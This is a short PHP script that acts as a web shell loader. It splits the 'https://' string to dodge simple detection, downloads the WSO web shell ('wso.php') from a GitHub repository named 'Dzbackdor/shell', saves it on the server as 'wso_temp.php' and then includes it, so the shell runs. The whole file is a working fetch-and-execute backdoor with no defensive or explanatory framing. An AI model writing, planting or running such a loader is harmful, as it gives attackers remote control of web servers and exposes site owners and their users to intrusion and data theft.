<?php
$awo = 'htt'.'ps://';
$url = $awo.'raw.githubusercontent.com/Dzbackdor/shell/master/wso.php';
$local_file = 'wso_temp.php';
if (!file_exists($local_file)) {
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($local_file, $content);
    } else {
        die("Failed to download the content.");
    }
}
include $local_file;
?>